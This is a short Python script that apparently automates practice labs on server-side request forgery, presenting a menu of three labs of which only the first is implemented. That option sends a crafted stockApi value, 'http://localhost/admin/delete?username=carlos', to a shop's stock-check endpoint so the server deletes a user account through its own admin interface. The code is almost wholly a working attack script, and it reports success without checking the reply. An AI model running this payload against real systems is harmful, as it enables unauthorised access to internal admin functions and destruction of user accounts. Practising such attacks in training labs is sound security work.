import requests
from tabulate import tabulate
from urllib.parse import urlparse

class textcolor:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    DANGER = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class SSRFLocalServer:

    def __init__(self, base_url):
        self.base_url = base_url

    def delete_username(self, url):
        payload = {'stockApi': url}
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}

        try:
            response = requests.post(self.base_url + '/product/stock', data=payload, headers=headers)
            print("\nDeleting username carlos..\n"+textcolor.DANGER+"Payload used: 'http://localhost/admin/delete?username=carlos'"+textcolor.ENDC)
            return 1

        except requests.exceptions.RequestException as e:
            print("\n"+textcolor.DANGER+"Error occurred: "+textcolor.ENDC)
            print(f"{str(e)}\n")
        except Exception as e:
            print(f"\n"+textcolor.DANGER+"Unexpected error occurred:"+textcolor.ENDC)
            print(f"{str(e)}\n")

def validate_url(url):
    parsed_url = urlparse(url)
    if parsed_url.scheme and parsed_url.netloc:
        return True
    return False

def handle_choice(number, url):

    if number == 1:

        # Create an instance of SSRFLocalServer with the base URL of the shopping application
        instanceVar = SSRFLocalServer(url)

        # Call the delete_username method to perform SSRF attack
        result = instanceVar.delete_username('http://localhost/admin/delete?username=carlos')

        if result:
            print("Username Deleted Successfully\n")

    elif number == 2:
        print("Placeholder")
    elif number == 3:
        print("Placeholder")
    else:
        print("Invalid choice.")

def main():

    url = input("\n"+textcolor.WARNING+"Enter the URL to perform SSRF: "+textcolor.ENDC)

    # Validate the URL
    if not validate_url(url):
        print(textcolor.DANGER+"Invalid URL: Check properly\n"+textcolor.ENDC)
        return

    data = [
        [textcolor.OKBLUE+"Lab 1"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against the local server"+textcolor.ENDC, ],
        [textcolor.OKBLUE+"Lab 2"+textcolor.ENDC, textcolor.OKBLUE+"Basic SSRF against another back-end system"+textcolor.ENDC],
        [textcolor.OKBLUE+"Lab 3"+textcolor.ENDC, textcolor.OKBLUE+"SSRF with blacklist-based input filter"+textcolor.ENDC]
    ]

    headers = [textcolor.OKGREEN+"Labs"+textcolor.ENDC,textcolor.OKGREEN+"Title"+textcolor.ENDC, textcolor.OKGREEN+"Description"+textcolor.ENDC]

    # Generate the table
    table = tabulate(data, headers, tablefmt="pretty")

    # Print the table
    print("\n"+table)

    choice = input("\n"+textcolor.WARNING+"Enter your Lab (1-7): "+textcolor.ENDC)

    handle_choice(int(choice), url)

if __name__ == '__main__':
    main()
